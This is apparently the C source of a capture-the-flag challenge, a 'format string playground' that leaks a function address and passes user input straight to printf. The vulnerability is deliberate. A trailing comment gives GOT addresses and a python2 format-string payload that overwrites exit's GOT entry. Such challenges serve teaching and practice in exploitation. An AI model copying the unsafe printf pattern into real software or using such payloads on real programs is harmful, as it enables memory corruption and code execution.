#define _GNU_SOURCE /* dlsym stuff */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <elf.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>

static __attribute__((noinline)) void super_function(void)
{
	printf("Congrats!\n");
	printf("The token is: TG16{hardc0re_overwriting_stuff}\n");

	/* everything is probably fucked now, so exit */
	syscall(SYS_exit);
}

struct elf_info {
	Elf32_Shdr *sections;
	Elf32_Sym *symtab;
	Elf32_Sym *dynsym;
	char *dynstr;
	char *shstrtab;
	uint32_t num_syms;
	uint32_t num_dynsym;
	uint32_t num_sections;
};

static inline void *mmap_file(const char *filename)
{
	int fd;
	off_t fsize;
	void *addr;

	fd = open(filename, O_RDONLY);
	if (fd == -1) {
		perror("open");
		return NULL;
	}

	fsize = lseek(fd, 0, SEEK_END);
	if (fsize < sizeof(Elf64_Ehdr)) {
		fprintf(stderr, "File too small!\n");
		return NULL;
	}

	addr = mmap(NULL, fsize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (addr == MAP_FAILED) {
		perror("mmap");
		return NULL;
	}

	close(fd);
	return addr;
}

static inline int check_elf_header(Elf32_Ehdr *head)
{
	if (head->e_ident[EI_MAG0] == ELFMAG0 &&
			head->e_ident[EI_MAG1] == ELFMAG1 &&
			head->e_ident[EI_MAG2] == ELFMAG2 &&
			head->e_ident[EI_MAG3] == ELFMAG3)
		return 0;

	fprintf(stderr, "Error: not an ELF file\n");
	return -1;
}

static inline int parse_elf(void *addr, struct elf_info *info)
{
	Elf32_Shdr *shead, *str;

	Elf32_Ehdr *head = (Elf32_Ehdr *)addr;
	if (check_elf_header(head))
		return -1;

	str = (Elf32_Shdr *)((char *)addr + head->e_shoff +
			(head->e_shentsize * head->e_shstrndx));
	char *ptr = (char *)addr + str->sh_offset;

	shead = (Elf32_Shdr *)((char *)addr + head->e_shoff);
	info->sections = shead;
	info->num_sections = head->e_shnum;

	for (int i = 0; i < head->e_shnum; i++) {
		Elf32_Shdr *s = &shead[i];
		if (!s->sh_name)
			continue;

		if (!strcmp(ptr + s->sh_name, ".symtab")) {
			info->num_syms = s->sh_size / sizeof(Elf32_Sym);
			info->symtab = (Elf32_Sym *)((char *)addr + s->sh_offset);
		} else if (!strcmp(ptr + s->sh_name, ".shstrtab")) {
			info->shstrtab = (char *)addr + s->sh_offset;
		} else if (!strcmp(ptr + s->sh_name, ".dynsym")) {
			info->num_dynsym = s->sh_size / sizeof(Elf32_Sym);
			info->dynsym = (Elf32_Sym *)((char *)addr + s->sh_offset);
		} else if (!strcmp(ptr + s->sh_name, ".dynstr")) {
			info->dynstr = (char *)addr + s->sh_offset;
		}

	}

	return 0;
}

static inline void *find_exit(void)
{
	void *addr = mmap_file("/bin/format3");
	if (!addr)
		exit(EXIT_FAILURE);

	struct elf_info info = { 0 };
	if (parse_elf(addr, &info))
		exit(EXIT_FAILURE);

	Elf32_Rel *rel_plt = NULL;
	for (int i = 0; i < info.num_sections; i++) {
		Elf32_Shdr *s = &info.sections[i];
		char *str = info.shstrtab + s->sh_name;

		if (!strcmp(str, ".rel.plt"))
			rel_plt = (Elf32_Rel *)((char *)addr + s->sh_offset);
	}

	void *exit_addr = NULL;
	/* TODO: fix dynsym size */
	for (int i = 0; i < info.num_dynsym; i++) {
		Elf32_Rel *cur_rel = &rel_plt[i];

		int index = ELF32_R_SYM(cur_rel->r_info);
		Elf32_Sym *sym = &info.dynsym[index];
		char *ptr = info.dynstr + sym->st_name;

		if (!strcmp(ptr, "exit")) {
			exit_addr = (void *)cur_rel->r_offset;
			break;
		}
	}

	//fprintf(stderr, "exit(): %p\n", exit_addr);
	return exit_addr;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("Super Secure Format String Playground 13.37\n");

	void *exit_addr = find_exit();

	printf("Welcome!\n");
	printf("super_function(): %p\n", super_function);

	printf("Enter an interesting message, please: ");

	char buf[512] = { 0 };
	if (!fgets(buf, sizeof(buf) - 1, stdin)) {
		perror("fgets()");
		exit(EXIT_FAILURE);
	}

	printf("You entered: ");
	printf(buf);

	fprintf(stderr, "exit value: 0x%08x\n", *(uint32_t *)exit_addr);
	exit(EXIT_SUCCESS);
}

/*
 * 0x08049a2c - exit@GLIBC_2.0
 * 080499b8
 * 0xf7e2 2b40 - system
 * python2 -c 'print "\x2c\x9a\x04\x08FAEN\x2e\x9a\x04\x08" + "%x." * 2 + "%11047x" + "%hn" + "%52386x" + "%hn"'
 *
 * 0xf7fd 4530 - fucked up system
 * 080499f8
 * 0x804855b - func
 *
 */
